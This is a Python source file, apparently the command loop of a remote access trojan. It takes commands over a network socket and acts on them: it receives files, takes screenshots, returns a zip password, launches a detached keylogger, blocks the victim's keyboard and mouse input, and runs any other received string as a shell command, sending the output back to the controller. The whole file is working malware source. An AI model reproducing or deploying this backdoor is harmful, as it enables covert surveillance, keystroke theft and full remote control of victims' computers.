#! /usr/bin/env python
##
#\file shell.py
#
#\brief The shell to run incoming commands
#
#\author Elephant Bomb
#
#\date 2016-04-24
from incomingFile import incomingFile
from openZip import openZip
from screenShot import screenShot
import subprocess
import sys

def runShell(socketHolder):
	data = socketHolder.recv(1024)
	if data:
		if data == "SENDFILE":
			incomingFile(socketHolder)
		elif data == "SCREENSHOT":
			screenShot()
		elif data == "OPENZIP":
			password = openZip()
			socketHolder.send(password)
		elif data == "EXIT":
			socketHolder.send('EXIT')
			socketHolder.close()
			sys.exit(0)
		elif data == "LOGKEYSON":
			# Execute an external program without waiting for it to finish
			CREATE_NEW_PROCESS_GROUP = 0x00000200
			DETACHED_PROCESS = 0x00000008
			pid = subprocess.Popen([sys.executable, "logKeys.py"],
				creationflags=DETACHED_PROCESS).pid
			socketHolder.send('Logger started')
		elif data == 'BLOCKINPUT':
			CREATE_NEW_PROCESS_GROUP = 0x00000200
			DETACHED_PROCESS = 0x00000008
			pid = subprocess.Popen([sys.executable, "blockInput.py"],
				creationflags=DETACHED_PROCESS).pid
			socketHolder.send('Block Input started')
		elif len(data) == 0:
			return True
		else:
			proc = subprocess.Popen(data, shell=True,
				stdout=subprocess.PIPE, stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)
			stdout_value = proc.stdout.read() + proc.stderr.read()
			socketHolder.send(stdout_value)
			return False
	else:
		print 'Lost connection to host. Will attempt to reconnect.'
		socketHolder = connect((HOST,PORT))